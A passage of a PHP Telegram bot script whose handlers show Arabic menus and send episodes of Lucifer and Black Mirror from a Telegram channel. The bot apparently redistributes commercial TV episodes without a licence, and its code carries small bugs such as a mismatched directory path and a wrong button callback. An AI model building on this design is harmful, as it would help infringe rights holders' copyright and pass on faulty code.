[['text'=>'Lucifer- 17','callback_data'=>"lucif17"],['text'=>'Lucifer- 18','callback_data'=>"lucif18"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"lucix"]],
]
])
]);
}

if($data=="lucif1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/61",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="lucif2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/62",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucif3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/63",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucif4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/64",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucif5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/65",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucif6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/66",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/67",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/68",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id,
]);
}

if($data=="lucif9"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/69",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id,
]);
}


if($data=="lucif10"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/70",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif11"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/71",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif12"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/72",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif13"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/73",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif14"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/74",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif15"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/75",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif16"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/76",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif17"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/77",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucif18"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/78",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="luci1" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Lucifer, 1','callback_data'=>"lucis1"],['text'=>'Lucifer , 2','callback_data'=>"lucis2"]],
[['text'=>'Lucifer, 3','callback_data'=>"lucis3"],['text'=>'Lucifer, 4','callback_data'=>"lucis4"]],
[['text'=>'Lucifer- 5','callback_data'=>"lucis5"],['text'=>'Lucifer- 6','callback_data'=>"lucis6"]],
[['text'=>'Lucifer- 7','callback_data'=>"lucis7"],['text'=>'Lucifer- 8','callback_data'=>"lucis8"]],
[['text'=>'Lucifer- 9','callback_data'=>"lucis9"],['text'=>'Lucifer- 10','callback_data'=>"lucis10"]],
[['text'=>'Lucifer- 11','callback_data'=>"lucis11"],['text'=>'Lucifer- 12','callback_data'=>"lucis12"]],
[['text'=>'Lucifer- 13','callback_data'=>"lucis13"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"lucix"]],
]
])
]);
}

if($data=="lucis1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/47",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="lucis2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/48",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucis3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/49",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucis4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/50",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucis5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/51",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucis6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/52",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucis7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/53",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucis8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/54",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id,
]);
}

if($data=="lucis9"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/55",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id,
]);
}


if($data=="lucis10"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/56",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucis11"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/57",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucis12"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/58",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucis13"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/59",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}


if($data=="luci" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اسم المسلسل : lucifner 
سنة الانتاج : 2015
التقييم : 8.2
النوع : جريمة, دراما, خيال
القصة : قرر لوسيفر مورننجستار أن يكون لديه ما يكفي من الخادمات الجليلة في الجحيم ويقرر قضاء بعض الوقت على الأرض لفهم الإنسانية بشكل أفضل. استقر في لوس أنجلوس - مدينة الملائكة.
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'lucifer S1','callback_data'=>"luci1"],['text'=>'lucifer S2','callback_data'=>"luci2"]],
[['text'=>'lucifer S3 ','callback_data'=>"luci3"]],
[['text'=>'lucifer S4','callback_data'=>"luci4"],['text'=>'lucifer S5','callback_data'=>"luci5"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"serii"]],
]
])
]);
}

if($data=="luci3" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'lucifer, 1','callback_data'=>"lucifn1"],['text'=>'lucifer , 2','callback_data'=>"lucifn2"]],
[['text'=>'lucifer, 3','callback_data'=>"lucifn3"],['text'=>'lucifer, 4','callback_data'=>"lucifn4"]],
[['text'=>'lucifer- 5','callback_data'=>"lucifn5"],['text'=>'lucifer- 6','callback_data'=>"lucifn6"]],
[['text'=>'lucifer- 7','callback_data'=>"lucifn7"],['text'=>'lucifer- 8','callback_data'=>"lucifn8"]],
[['text'=>'lucifer- 9','callback_data'=>"lucifn9"],['text'=>'lucifer- 10','callback_data'=>"lucifn10"]],
[['text'=>'lucifer- 11','callback_data'=>"lucifn11"],['text'=>'lucifer- 12','callback_data'=>"lucifn12"]],
[['text'=>'lucifer- 13','callback_data'=>"lucifn13"],['text'=>'lucifer- 14','callback_data'=>"lucifn14"]],
[['text'=>'lucifer- 15','callback_data'=>"lucifn15"],['text'=>'lucifer- 16','callback_data'=>"lucifn16"]],
[['text'=>'lucifer- 17','callback_data'=>"lucifn17"],['text'=>'lucifer- 18','callback_data'=>"lucifn18"]],
[['text'=>'lucifer- 19','callback_data'=>"lucifn19"],['text'=>'lucifer- 20','callback_data'=>"lucifn20"]],
[['text'=>'lucifer- 21','callback_data'=>"lucifn21"],['text'=>'lucifer- 22','callback_data'=>"lucifn22"]],
[['text'=>'lucifer- 23','callback_data'=>"lucifn23"],['text'=>'lucifer- 24','callback_data'=>"lucifn24"]],
[['text'=>'lucifer- 25','callback_data'=>"lucifn24"],['text'=>'lucifer- 26','callback_data'=>"lucifn26"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"lucix"]],
]
])
]);
}

if($data=="lucifn1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/80",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}



if($data=="lucifn2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/81",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifn3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/82",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifn4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/83",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifn5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/84",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifn6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/85",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/87",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/88",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id,
]);
}

if($data=="lucifn9"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/89",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id,
]);
}


if($data=="lucifn10"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/90",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn11"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/91",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn12"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/92",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn13"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/93",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn14"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/94",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn15"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/95",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn16"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/96",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn17"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/97",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn18"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/98",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn19"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/99",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn20"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/100",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn21"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/101",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifn22"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/102",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn23"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/103",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn24"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/104",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="lucifn25"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/105",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="lucifn26"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/106",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}


if($data=="blackms5" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'BLack Mirror 1','callback_data'=>"bbkkllm1"],['text'=>'BLack Mirror , 2','callback_data'=>"bbkkllm2"]],
[['text'=>'BLack Mirror 3','callback_data'=>"bbkkllm3"]],

[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"blackm"]],
]
])
]);
}

if($data=="bbkkllm1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/41",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bbkkllm2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/42",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bbkkllm3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/43",
'caption'=>" 
BLack Mirror - S5
ا",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="blackms2" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'BLack Mirror 1','callback_data'=>"bklmm1"],['text'=>'BLack Mirror , 2','callback_data'=>"bklmm2"]],
[['text'=>'BLack Mirror- 3','callback_data'=>"bklmm3"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"blackm"]],
]
])
]);
}
if($data=="blackms3" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'BLack Mirror 1','callback_data'=>"bkklm1"],['text'=>'BLack Mirror , 2','callback_data'=>"bkklm2"]],
[['text'=>'BLack Mirror 3','callback_data'=>"bkklm3"],['text'=>'BLack Mirror , 4','callback_data'=>"bkklm4"]],
[['text'=>'BLack Mirror 5','callback_data'=>"bkklm5"],['text'=>'BLack Mirror , 6','callback_data'=>"bkklm6"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"blackm"]],
]
])
]);
}
if($data=="blackms4" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'BLack Mirror 1','callback_data'=>"bbkklm1"],['text'=>'BLack Mirror , 2','callback_data'=>"bbkklm2"]],
[['text'=>'BLack Mirror 3','callback_data'=>"bbkklm3"],['text'=>'BLack Mirror , 4','callback_data'=>"bbkklm4"]],
[['text'=>'BLack Mirror 5','callback_data'=>"bbkklm5"],['text'=>'BLack Mirror , 6','callback_data'=>"bbkklm6"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"blackm"]],
]
])
]);
}

if($data=="bbkklm1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/35",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bbkklm2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/36",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bbkklm3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/37",
'caption'=>" 
BLack Mirror - S4
ا",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="bbkklm4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/38",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="bbkklm5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/39",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bbkklm6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/40",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}


if($data=="bkklm1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/29",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bkklm2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/30",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="bkklm3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
